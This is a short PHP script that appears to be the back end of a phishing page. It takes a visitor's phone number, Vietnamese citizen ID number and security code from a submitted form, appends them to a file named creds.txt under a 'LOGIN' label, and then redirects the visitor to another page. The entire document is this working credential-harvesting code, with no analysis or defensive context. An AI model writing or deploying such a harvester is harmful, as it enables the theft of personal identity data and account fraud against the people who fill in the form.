<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $sdt = $_POST['sdt'] ?? 'N/A';
    $cccd = $_POST['cccd'] ?? 'N/A';
    $capchar = $_POST['capchar'] ?? 'N/A';

    $entry = "LOGIN | SDT: $sdt | CCCD: $cccd | Mã bảo mật: $capchar\n";
    $file = 'creds.txt';

    file_put_contents($file, $entry, FILE_APPEND | LOCK_EX);

    header("Location: info.html");
    exit();
}
?>
